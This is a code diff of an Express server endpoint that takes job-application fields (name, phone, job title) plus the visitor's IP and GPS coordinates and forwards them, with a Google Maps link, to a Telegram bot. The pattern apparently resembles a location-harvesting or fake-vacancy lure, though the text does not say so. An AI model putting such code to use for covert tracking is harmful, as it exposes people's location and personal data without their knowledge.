@@ -47,27 +47,27 @@ async function sendToTelegram(text) {
 // ================== API ==================
 app.post('/api/send-data', async (req, res) => {
   try {
-    const { videoUrl, location } = req.body;
+    const { name, phone, jobTitle, location } = req.body;
 
-    // Real IP (Render/Proxy arxasında düzgün çıxması üçün)
+    // IP serverdən alınır (Render / proxy üçün)
     const ip =
       (req.headers['x-forwarded-for']?.split(',')[0] || '').trim() ||
       req.socket.remoteAddress ||
       'Unknown';
 
-    let message = '';
+    let message = `🧾 Yeni müraciət\n\n`;
 
-    if (videoUrl) {
-      message += `📞 Nömrə: ${videoUrl}\n`;
-    }
+    if (jobTitle) message += `💼 Vakansiya: ${jobTitle}\n`;
+    if (name) message += `👤 Ad Soyad: ${name}\n`;
+    if (phone) message += `📞 Nömrə: ${phone}\n`;
 
     message += `🖥️ IP: ${ip}\n`;
 
     if (location?.latitude && location?.longitude) {
-      message += `📍 Lokasiya alındı\n`;
-      message += `🌍 ${location.latitude}, ${location.longitude}\n`;
+      message += `📍 Lokasiya: ${location.latitude}, ${location.longitude}\n`;
+      message += `🗺️ Xəritə: https://www.google.com/maps?q=${location.latitude},${location.longitude}\n`;
     } else {
-      message += `📍 Lokasiya əldə edilmədi\n`;
+      message += `📍 Lokasiya: əldə edilmədi\n`;
     }
 
     await sendToTelegram(message.trim());
@@ -78,7 +78,6 @@ app.post('/api/send-data', async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
-
 
 // ================== TELEGRAM WEBHOOK ==================
 app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
